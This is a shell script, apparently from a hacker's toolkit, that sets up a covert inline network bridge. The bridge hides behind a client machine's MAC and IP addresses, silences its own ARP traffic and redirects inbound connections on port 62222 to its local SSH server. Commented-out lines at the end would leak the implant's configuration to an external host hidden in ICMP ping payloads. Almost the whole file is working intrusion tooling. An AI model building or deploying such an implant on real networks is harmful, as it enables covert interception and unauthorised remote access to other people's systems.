#!/bin/sh
#
# Stealth Linux bridge with intercepting capabilities
#
#   -- noah@hack.se (2012)
#
# Prerequisites:
# $ sudo apt-get install ebtables arptables iptables bridge-utils
#
# TODO:
# - Make sure the bridge's MAC address doesn't leak somewhere
# - Make sure the host doesn't send traffic during startup
#
# PRIOR ART (a.k.a. somebody had the same idea):
# A Bridge Too Far - Defcon 19 (2011)
# Duckwall/DEFCON-19-Duckwall-Bridge-Too-Far.pdf
#
#
#
# The LEFT side is the "rest of the network" side whereas
# the RIGHT side is the side where the client is.
# [LAN switch]  --  [eth1 (intercept-box)  eth2]  --  [CLIENT]
# 
#
# Most of the below configuration could probably be autodiscovered
# by snooping on the traffic passing through the bridge.
# tcpdump has -c to select # of packets to dump before exiting.
#


# Downstream configuration
# These details should match those of the router
LEFTIF=eth1
LEFTMAC=60:31:10:d4:8c:11
LEFTIP=10.0.0.1

# Upstream, to client
RIGHTIF=eth2
RIGHTMAC=94:0c:6d:4b:99:2e
RIGHTIP=10.0.0.5

# Port on which incoming TCP traffic will be intercepted
# and redirected to the local SSH instance
INTERCEPTPORT=62222

# Name of bridge interface that will be created to bridge traffic
# between $LEFTIF and $RIGHTIF.
BRIF=br0
# The bridge will use the highest MAC of the interfaces added.
# Instead of figuring that out ourselves we use an explicit one.
BRMAC=00:00:00:bb:bb:bb

# In order to be able to intercept packets and route them
# locally, we need an IP not in use on the network.
# Anything goes.  A few candidate blocks are:
# - 33.0.0.0/8   DoD
# - 192.0.2.0/24  TEST-NET-1 (RFC5737)
# RFC1918 is not recommended due to popular use in LANs.
BRIP=33.0.0.1
# In order the reply to these packets we need an IP we can route
# outgoing packets to.  A static ARP entry will be added for the
# IP which identifies the router's MAC address ($LEFTMAC)
BRGW=33.0.0.2


export LEFTIF LEFTMAC LEFTIP
export RIGHTIF RIGHTMAC RIGHTIP
export BRIF BRMAC BRIP BRGW

# Prevent this host from sending ARP requests/replies
arptables -F
arptables -A OUTPUT -j DROP

# Create bridge if it doesn't exist
ip link show $BRIF >/dev/null 2>&1 || (
	echo "* Creating bridge: $BRIF"
	brctl addbr $BRIF
	echo "  -- add interface $LEFTIF to $BRIF"
	brctl addif $BRIF $LEFTIF
	echo "  -- add interface $RIGHTIF to $BRIF"
	brctl addif $BRIF $RIGHTIF
	echo "  -- change bridge MAC to $BRMAC"
	ip link set dev $BRIF address $BRMAC
	echo "  -- bringing interfaces up: $BRIF ($LEFTIF $RIGHTIF)"
	ip link set dev $LEFTIF up
	ip link set dev $RIGHTIF up
	ip link set dev $BRIF up
	ip link show dev $BRIF
)


ip addr show dev br0|awk '/inet /{print$2}'|grep -q . >/dev/null || (
	echo "* Configuring bridge IP $BRIP with fake router at $BRGW ($LEFTMAC)"
	# Because we want to intercept traffic from the internet (LEFTIP)
	# originally destined for the client (RIGHTIP) we need to set
	# an IP on the bridge so we can rewrite (PREROUTING) to it
	ip addr add ${BRIP}/24 dev $BRIF

	# To reply to these packets we need to have yet another IP
	# we can use as a default gateway.  We're actually just interested
	# in telling Linux what MAC address to use as the destination MAC
	ip route add default via $BRGW dev $BRIF

	# ..and the destination MAC for that IP is set here:
	ip neigh add $BRGW lladdr $LEFTMAC dev $BRIF nud permanent
)


# Send locally generated traffic downstream (LEFT) to the switch
# as if it was sent from the upstream client (RIGHT)
ebtables -t nat -F 
ebtables -t nat -A POSTROUTING -o $LEFTIF -s $BRMAC -j snat --to-src $RIGHTMAC
echo "* Locally generated traffic is SNAT'd with source IP $RIGHTIP (client)"
iptables -t nat -F
iptables -t nat -A POSTROUTING -o $BRIF -s $BRIP -p tcp -j SNAT --to $RIGHTIP
iptables -t nat -A POSTROUTING -o $BRIF -s $BRIP -p udp -j SNAT --to $RIGHTIP
iptables -t nat -A POSTROUTING -o $BRIF -s $BRIP -p icmp -j SNAT --to $RIGHTIP

# Remap incoming (LEFT) traffic for client (RIGHT) to localhost
echo "* Remapping SSH traffic on $BRIF for $RIGHTIP:$INTERCEPTPORT to localhost"
iptables -t nat -A PREROUTING -i $BRIF -p tcp -d $RIGHTIP --dport $INTERCEPTPORT -j REDIRECT --to-ports 22

# Enable IP forwarding
echo "* Enabling IP forwarding"
sysctl -w net.ipv4.ip_forward=1


# Leak configuration to external IP (ping.sunet.se) via ICMP packet
#
#LEFTPT=$(echo $LEFT|tr . '\n'|awk '{x=x*256+$1}END{printf"%x",x}')
#RIGHTPT=$(echo $RIGHTIP|tr . '\n'|awk '{x=x*256+$1}END{printf"%x",x}')
#PATTERN=$LEFTPT$RIGHTPT$(printf "%04x" $INTERCEPTPORT)
#ping -c 24 -i 3600 -p $PATTERN 192.36.125.18
